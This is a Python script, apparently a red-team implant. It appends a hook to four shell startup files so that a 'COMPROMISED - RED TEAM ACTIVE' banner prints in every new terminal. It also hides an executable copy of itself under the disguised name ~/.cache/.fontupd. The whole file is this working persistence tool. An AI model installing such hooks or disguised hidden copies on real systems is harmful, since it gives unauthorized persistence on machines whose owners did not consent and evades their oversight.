#!/usr/bin/env python3
# rt_final.py - RED TEAM banner after EVERY command - WORKS FOR REAL

import os
import sys

BANNER = r"""
\033[91m
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║   ██████╗ ███████╗██████╗     ████████╗███████╗ █████╗ ███╗   ███╗   ║
║   ██╔══██╗██╔════╝██╔══██╗    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║   ║
║   ██████╔╝█████╗  ██████╔╝       ██║   █████╗  ███████║██╔████╔██║   ║
║   ██╔══██╗██╔══╝  ██╔══██╗       ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║   ║
║   ██║  ██║███████╗██████╔╝       ██║   ███████╗██║  ██║██║ ╚═╝ ██║   ║
║   ╚═╝  ╚═╝╚══════╝╚═════╝        ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝   ║
║                                                           ║
║               COMPROMISED - RED TEAM ACTIVE               ║
╚═══════════════════════════════════════════════════════════╝
\033[0m
"""

def install():
    # The ONLY line that actually works everywhere
    hook_line = f'python3 "{os.path.abspath(__file__)}" banner 2>/dev/null\n'

    # These are the only files we really need
    targets = [
        "~/.bashrc",
        "~/.zshrc",
        "~/.bash_profile",
        "~/.profile"
    ]

    installed = False
    for t in targets:
        path = os.path.expanduser(t)
        try:
            with open(path, "a") as f:
                f.write("\n" + hook_line)
            installed = True
        except:
            continue

    # Hide a backup copy
    try:
        os.makedirs(os.path.expanduser("~/.cache"), exist_ok=True)
        os.system(f"cp '{__file__}' ~/.cache/.fontupd 2>/dev/null && chmod +x ~/.cache/.fontupd")
    except:
        pass

    pass

    if installed:
        print("[+] RED TEAM banner installed - open a NEW terminal to see it work")
    else:
        print("[-] Failed to write to shell files")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        if sys.argv[1] == "--setup":
            install()
        elif sys.argv[1] == "banner":
            print(BANNER)
    else:
        print(BANNER)
